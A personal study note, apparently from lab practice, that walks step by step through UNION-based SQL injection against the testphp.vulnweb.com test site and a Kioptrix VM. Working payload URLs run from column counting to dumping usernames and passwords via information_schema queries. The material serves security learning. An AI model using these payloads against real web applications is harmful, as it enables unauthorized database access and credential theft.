# SQL Injection (SQLi)

`There are many types of injection vulnerabilities possible within web applications, such as HTTP injection, code injection, and command injection. The most common example, however, is SQL injection. A SQL injection occurs when a malicious user attempts to pass input that changes the final SQL query sent by the web application to the database, enabling the user to perform other unintended SQL queries directly against the database.

There are many ways to accomplish this. To get a SQL injection to work, the attacker must first inject SQL code and then subvert the web application logic by changing the original query or executing a completely new one. First of all, the attacker has to inject code outside the expected user input limits, so it does not get executed as simple user input. In the most basic case, this is done by injecting a single quote (') or a double quote (") to escape the limits of user input and inject data directly into the SQL query.

Once an attacker can inject, they have to look for a way to execute a different SQL query. This can be done using SQL code to make up a working query that executes both the intended and the new SQL queries. There are many ways to achieve this, like using stacked queries or using Union queries.

Finally, to retrieve our new query's output, we have to interpret it or capture it on the front end of the web application`
___

### First step :
_we can try to check if there is a SQLI with adding '_
If the page remains in same page or showing that page not found or showing some other webpages. Then it is not vulnerable.
If it showing any errors which is related to sql query,then it is vulnerable
for eg:
![[Pasted image 20211206181830.png]]

### Step two :
_Finding out the number of columns_
Now we know that the web is vulnerable next step is to find out the number of columns in the table we can do that by using order by query 
https://testphp.vulnweb.com/listproducts.php?cat=1 order by n
replace n with numbers you want or you can use them together by adding , between the numbers 
```
https://testphp.vulnweb.com/listproducts.php?cat=1 order by n,n,n,n,n,,n,n
for #eg. 1 2 3 4 5 6 7 8 


#Checking for fields
OR UNION # Keep adding null till you don't get an error
https://testphp.vulnweb.com/listproducts.php?cat=' UNION SELECT null,null,null; -- -


```
```
https://testphp.vulnweb.com/listproducts.php?cat=1%20order%20by%202
https://testphp.vulnweb.com/listproducts.php?cat=1%20order%20by%203
https://testphp.vulnweb.com/listproducts.php?cat=1%20order%20by%201,2,3,4,5,6
```
and sometimes it might not work and wee need to add "--" at the end of the query 
```
https://testphp.vulnweb.com/listproducts.php?cat=1 order by 1,2,3,4,5,6-- -
```
we can keep raising the number up till we get an error that means that column doesn't exist and we 
![[Pasted image 20211206182930.png]]

### Step Three :
_Checking for the vulnerable column_
Using “union select columns_sequence” we can find the vulnerable part of the table. Replace the “order by n” with this statement. And change the id value to negative(i mean id=-2,must change,but in some website may work without changing).

if the number of columns is 6 we can do the query like this : 
```
http://kioptrix3.com/gallery/gallery.php?id=-2%20union select 1,2,3,4,5,6--
```
![[Pasted image 20211206183809.png]]
or if it didn't work we can try 
```
http://kioptrix3.com/gallery/gallery.php?id=-2%20and%201=1%20union%20select%201,2,3,4,5,6--
```
it will show some numbers on the page let's take one of them and test on it 
![[Pasted image 20211206183958.png]]
let's try 3 
### Step Four :
_Enumerating the version tables database users etc._
now in the url we can change the number 3 to a SQL command 
```
http://kioptrix3.com/gallery/gallery.php?id=-2 and 1=2 union select 1,2,version(),4,5,6--
```
![[Pasted image 20211206184144.png]]
and it works! 
now we can take this further and extract more info from the system 
we can use database() 
![[Pasted image 20211206184310.png]]

or user()
![[Pasted image 20211206184328.png]]

if the above examples didn't work we can use hex and unhex 
```
http://kioptrix3.com/gallery/gallery.php?id=-2 and 1=2 union select 1,2,unhex(hex(@@version)),4,5,6
```
![[Pasted image 20211206184440.png]]

### Step Five :
_Getting Table name_
in this step we can use group_concat(table_name) from information_schema.tables where table_schema=database() to get the table name 

![[Pasted image 20211206184647.png]]

now we have table names on the database

`if the version is 4 or some others, you have to guess the table names. (user, tbluser).  It is hard and bore to do sql inection with version 4.`

### Step Six :
_Finding Column name_
Now we replace the “group_concat(table_name) with the “group_concat(column_name)”
and 
Replace the “from information_schema.tables where table_schema=database()–” with “FROM information_schema.columns WHERE table_name=SQLCHARS–
now what we should do is convert the table name into a SQLCHARS 
we can do that in : http://www.waraxe.us/sql-char-encoder.html
now we want to get columns inside gallarific_users table so converting gallarific_users into sqlchars we get 0x67616c6c6172696669635f7573657273
adding that to our url 

```
http://kioptrix3.com/gallery/gallery.php?id=-2%20and%201=2%20union%20select%201,2,group_concat(column_name),4,5,6%20from%20information_schema.columns%20where%20table_name=0x67616c6c6172696669635f7573657273
```

![[Pasted image 20211206190118.png]]

now we have all the columns inside gallarific_users

### Step Seven :
_Dumping the database columns values_

Now we replace the replace group_concat(column_name) with group_concat(columnname,0x3a,anothercolumnname).
columnname should be replaced with what column name we want to get 
and anothercolumnname should be replaced with what other column we also want to see 
Now we  replace the ” from information_schema.columns where table_name= 0x67616c6c6172696669635f7573657273” with the “from table_name”
http://kioptrix3.com/gallery/gallery.php?id=-2 union select 1,2,group_concat(username,0x3a,password),4,5,6 from gallarific_users--
![[Pasted image 20211206190710.png]]
and Voila! 
we have the users and passwords from the table users


```sql

select schema_name from information_schema.schemata -- show databases

select table_name from information_schema.tables where table_schema = 'DATABASE' -- show tables

select column_name from information_schema.columns where table_name = 'TABLE' -- show columns

select privilege_type FROM information_schema.user_privileges where grantee = "'USER'" --check priv



```